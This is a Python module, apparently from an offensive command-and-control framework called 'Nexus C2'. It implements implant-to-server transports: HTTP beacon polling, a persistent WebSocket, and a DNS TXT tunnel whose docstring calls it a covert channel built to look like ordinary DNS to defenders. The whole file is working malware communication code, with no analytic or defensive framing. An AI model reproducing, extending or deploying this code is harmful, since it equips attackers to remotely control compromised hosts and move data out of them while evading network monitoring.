"""
Nexus C2 — Transport layer abstraction.

Three transports available, selected via NEXUS_TRANSPORT env var:
  http  (default) — HTTP POST polling, 5-8s beacon interval
  ws              — WebSocket persistent connection, real-time
  dns             — DNS TXT tunneling over UDP port 5354, covert channel
"""

import base64
import logging
import os
import socket
import struct
import time

import requests
import websocket  # websocket-client

log = logging.getLogger("nexus.transport")

# ── DNS wire-format constants ─────────────────────────────────────────────────
_DNS_PORT    = int(os.environ.get("NEXUS_DNS_PORT", "5354"))
_DNS_DOMAIN  = "n.c2"          # apex used in DNS queries
_DNS_TIMEOUT = 10.0


# ── Base ──────────────────────────────────────────────────────────────────────

class BaseTransport:
    name: str = "base"

    def post(self, frame: bytes, session_id_hex: str = "") -> bytes:
        raise NotImplementedError

    def close(self) -> None:
        pass


# ── HTTP (existing behaviour, now in a class) ─────────────────────────────────

class HttpTransport(BaseTransport):
    name = "http"

    def __init__(self, server_url: str):
        self._url = server_url.rstrip("/") + "/"
        self._session = requests.Session()

    def post(self, frame: bytes, session_id_hex: str = "") -> bytes:
        headers = {"Content-Type": "application/octet-stream"}
        if session_id_hex:
            headers["X-Session-Id"] = session_id_hex
        resp = self._session.post(self._url, data=frame, headers=headers, timeout=10)
        resp.raise_for_status()
        return resp.content

    def close(self) -> None:
        self._session.close()


# ── WebSocket ─────────────────────────────────────────────────────────────────

class WsTransport(BaseTransport):
    """Persistent WebSocket connection. Full-duplex, near real-time."""
    name = "ws"

    def __init__(self, server_url: str):
        ws_url = server_url.rstrip("/").replace("http://", "ws://").replace("https://", "wss://")
        self._url = ws_url + "/ws"
        self._ws: websocket.WebSocket | None = None

    def _connect(self) -> None:
        self._ws = websocket.WebSocket()
        self._ws.connect(self._url, timeout=10)
        log.info("[ws] connected to %s", self._url)

    def post(self, frame: bytes, session_id_hex: str = "") -> bytes:
        if self._ws is None or not self._ws.connected:
            self._connect()
        header = session_id_hex.encode() if session_id_hex else b""
        # Wire: [sid_len 1B][sid bytes][frame]
        wire = bytes([len(header)]) + header + frame
        self._ws.send_binary(wire)
        return self._ws.recv()

    def close(self) -> None:
        if self._ws:
            try:
                self._ws.close()
            except Exception:
                pass
            self._ws = None


# ── DNS TXT Tunnel ────────────────────────────────────────────────────────────

def _dns_build_query(txid: bytes, labels: list[str]) -> bytes:
    """Build a minimal DNS TXT query."""
    header = (
        txid
        + b"\x01\x00"   # flags: standard query, recursion desired
        + b"\x00\x01"   # QDCOUNT = 1
        + b"\x00\x00"   # ANCOUNT = 0
        + b"\x00\x00"   # NSCOUNT = 0
        + b"\x00\x00"   # ARCOUNT = 0
    )
    qname = b"".join(bytes([len(l)]) + l.encode() for l in labels) + b"\x00"
    question = qname + b"\x00\x10\x00\x01"  # QTYPE=TXT, QCLASS=IN
    return header + question


def _dns_parse_txt(resp: bytes) -> bytes:
    """Extract concatenated TXT strings from a DNS response."""
    if len(resp) < 12:
        raise ValueError("DNS response too short")
    ancount = struct.unpack("!H", resp[6:8])[0]
    if ancount == 0:
        raise ValueError("DNS response has no answers")

    # Skip header (12B) and question section (scan for \x00 terminator)
    pos = 12
    while pos < len(resp) and resp[pos] != 0:
        length = resp[pos]
        if length & 0xC0 == 0xC0:   # pointer
            pos += 2
            break
        pos += 1 + length
    else:
        pos += 1  # skip the \x00 terminator
    pos += 4      # skip QTYPE + QCLASS

    # Parse first answer RR
    if pos + 2 > len(resp):
        raise ValueError("truncated DNS response")
    if resp[pos] & 0xC0 == 0xC0:    # name pointer
        pos += 2
    else:
        while pos < len(resp) and resp[pos] != 0:
            pos += 1 + resp[pos]
        pos += 1
    pos += 8      # TYPE + CLASS + TTL
    rdlength = struct.unpack("!H", resp[pos: pos + 2])[0]
    pos += 2

    # TXT RDATA: one or more [length 1B][string]
    end = pos + rdlength
    txt_parts = []
    while pos < end:
        slen = resp[pos]; pos += 1
        txt_parts.append(resp[pos: pos + slen]); pos += slen
    return b"".join(txt_parts)


class DnsTransport(BaseTransport):
    """
    DNS TXT tunnel — frames encoded as base32 subdomains, responses in TXT records.
    Covert channel: traffic looks like DNS resolution to a defender.
    """
    name = "dns"

    def __init__(self, server_host: str):
        self._host = server_host
        self._port = _DNS_PORT
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.settimeout(_DNS_TIMEOUT)

    def post(self, frame: bytes, session_id_hex: str = "") -> bytes:
        # Same framing as WsTransport: [sid_len 1B][sid bytes][frame]
        header  = session_id_hex.encode("ascii") if session_id_hex else b""
        payload = bytes([len(header)]) + header + frame
        encoded = base64.b32encode(payload).decode().lower().rstrip("=")

        # Split into ≤63-char DNS labels
        labels = [encoded[i: i + 63] for i in range(0, len(encoded), 63)]
        labels += _DNS_DOMAIN.split(".")

        txid = os.urandom(2)
        query = _dns_build_query(txid, labels)
        self._sock.sendto(query, (self._host, self._port))

        resp, _ = self._sock.recvfrom(4096)
        txt = _dns_parse_txt(resp)

        # Response is also base32-encoded
        padding = (8 - len(txt) % 8) % 8
        return base64.b32decode(txt.upper() + b"=" * padding)

    def close(self) -> None:
        self._sock.close()


# ── Factory ───────────────────────────────────────────────────────────────────

def make_transport(server_url: str) -> BaseTransport:
    """Select transport via NEXUS_TRANSPORT env var (http|ws|dns)."""
    kind = os.environ.get("NEXUS_TRANSPORT", "http").lower()
    host = server_url.split("//")[-1].split(":")[0].split("/")[0]
    if kind == "ws":
        log.info("transport: WebSocket → %s", server_url)
        return WsTransport(server_url)
    if kind == "dns":
        log.info("transport: DNS tunnel → %s:%d", host, _DNS_PORT)
        return DnsTransport(host)
    log.info("transport: HTTP → %s", server_url)
    return HttpTransport(server_url)
